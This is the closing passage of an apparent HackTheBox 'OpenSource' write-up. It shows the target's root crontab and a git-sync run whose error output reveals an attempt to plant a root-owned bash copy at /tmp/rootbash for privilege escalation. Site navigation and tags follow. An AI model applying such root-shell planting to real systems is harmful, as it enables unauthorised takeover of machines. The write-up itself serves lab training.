 # To define the time you can provide concrete values for
 # minute (m), hour (h), day of month (dom), month (mon),
 # and day of week (dow) or use '*' in these fields (for 'any').# 
 # Notice that tasks will be started based on the cron's system
 # daemon's notion of time and timezones.
 # 
 # Output of the crontab jobs (including errors) is sent through
 # email to the user the crontab file belongs to (unless redirected).
 # 
 # For example, you can run a backup of all your user accounts
 # at 5 a.m every week with:
 # 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
 # 
 # For more information see the manual pages of crontab(5) and cron(8)
 # 
 # m h  dom mon dow   command
 @reboot sleep 15 ; /root/meta/start.sh
 * * * * * /usr/local/bin/git-sync
 */2 * * * * /root/meta/app/clean.sh
 */2 * * * * cp /root/config /home/dev01/.git/config
	
 root@opensource:~# /usr/local/bin/git-sync
 Changes detected, pushing..
 cp: cannot create regular file '/tmp/rootbash': Text file busy

 ^C
 root@opensource:~# 
</pre></table></code></div></div></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/hackthebox-linux/'>HackTheBox - Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux-priv-esc-sudo-gtfo-bin/" class="post-tag no-text-decoration" >linux-priv-esc/sudo/gtfo-bin</a> <a href="/tags/exploit-file-upload-bypass/" class="post-tag no-text-decoration" >exploit/file-upload-bypass</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - OpenSource - Yufong&amp;u=https://yufongg.github.io/posts/OpenSource/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label=""> <i class="fa-fw "></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Blunder/">HackTheBox - Blunder</a><li><a href="/posts/Attacktive-Directory/">TryHackMe - Attacktive Directory</a><li><a href="/posts/Tommy-Boy-1/">Vulnhub - Tommy Boy 1</a><li><a href="/posts/Tiki-1/">Vulnhub - Tiki 1</a><li><a href="/posts/Breach-1/">Vulnhub - Breach 1</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/UpDown/"><div class="card-body"> <em class="timeago small" data-ts="1674403200" > 2023-01-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - UpDown</h3><div class="text-muted small"><p> Overview This machine begins w/ a web enumeration, /dev/.git is discovered, since .git is found, we are able to view the logs and commits of the git repository, providing us w/ the header needed to...</p></div></div></a></div><div class="card"> <a href="/posts/Shocker/"><div class="card-body"> <em class="timeago small" data-ts="1660924800" > 2022-08-20 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Shocker</h3><div class="text-muted small"><p> Overview This machine begins w/ a web directory enumeration, finding a cgi-bin/ directory, and by further enumerating the found directory (cgi-bin/), a bash script is found, allowing us to use an e...</p></div></div></a></div><div class="card"> <a href="/posts/Beep/"><div class="card-body"> <em class="timeago small" data-ts="1661184000" > 2022-08-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Beep</h3><div class="text-muted small"><p> Overview This machine has 4 ways to obtain an initial shell. For the 1st method, after a web enumeration at TCP/443 (HTTPS), it is discovered that Elastix running on the webserver. After searching ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Paper/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox - Paper</p></a> <a href="/posts/Trick/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox - Trick</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://yufongg.github.io/posts/OpenSource/'; this.page.identifier = '/posts/OpenSource/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://yufongg-github-io.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> Â© 2025 <a href="https://github.com/yufongg">yufongg</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LS5TVPBBZE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LS5TVPBBZE'); }); </script>
